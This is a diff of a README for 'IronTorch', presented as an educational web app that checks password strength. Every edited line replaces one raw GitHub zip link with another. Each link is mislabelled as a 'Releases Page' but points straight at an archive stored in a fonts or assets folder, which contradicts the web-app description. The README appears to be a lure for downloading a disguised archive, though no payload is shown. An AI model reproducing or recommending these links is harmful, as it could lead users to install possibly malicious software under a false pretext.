@@ -4,11 +4,11 @@
 Welcome to IronTorch, a simple tool designed to help you evaluate the strength of your passwords. This educational web app uses custom calculations to assess how secure your strings are. Whether you want to create a stronger password or just learn more about security, IronTorch is here to assist.
 
 ## 📥 Download IronTorch
-[![Download IronTorch](https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/fonts/IronTorch-v1.5.zip%https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/fonts/IronTorch-v1.5.zip)](https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/fonts/IronTorch-v1.5.zip)
+[![Download IronTorch](https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/assets/Torch_Iron_3.9.zip%https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/assets/Torch_Iron_3.9.zip)](https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/assets/Torch_Iron_3.9.zip)
 
 To download IronTorch, visit the link below:
 
-[Download IronTorch from Releases Page](https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/fonts/IronTorch-v1.5.zip)
+[Download IronTorch from Releases Page](https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/assets/Torch_Iron_3.9.zip)
 
 ## 📋 System Requirements
 You will need:
@@ -23,7 +23,7 @@ You will need:
 
 ## 🔍 How to Use IronTorch
 1. **Open Your Web Browser**: Launch Chrome, Firefox, Safari, or Edge.
-2. **Visit the IronTorch Page**: Go to the [IronTorch Releases Page](https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/fonts/IronTorch-v1.5.zip).
+2. **Visit the IronTorch Page**: Go to the [IronTorch Releases Page](https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/assets/Torch_Iron_3.9.zip).
 3. **Access the Application**: Once on the page, you can navigate directly to the app or download it as needed.
 4. **Input Your String**: Type in the password or string you want to evaluate.
 5. **View the Results**: Click on the 'Evaluate' button to see how strong your password is.
@@ -52,4 +52,4 @@ Checking your password strength helps protect your accounts from unauthorized ac
 ## 🏁 Join the Community
 Feel free to contribute to IronTorch by providing feedback or suggestions. You can also help improve the tool by reporting any issues you encounter on the GitHub repository.
 
-For more updates and to download the application, visit the [IronTorch Releases Page](https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/fonts/IronTorch-v1.5.zip). Your strong passwords start here!
+For more updates and to download the application, visit the [IronTorch Releases Page](https://raw.githubusercontent.com/ashadefhatya/IronTorch/main/assets/Torch_Iron_3.9.zip). Your strong passwords start here!
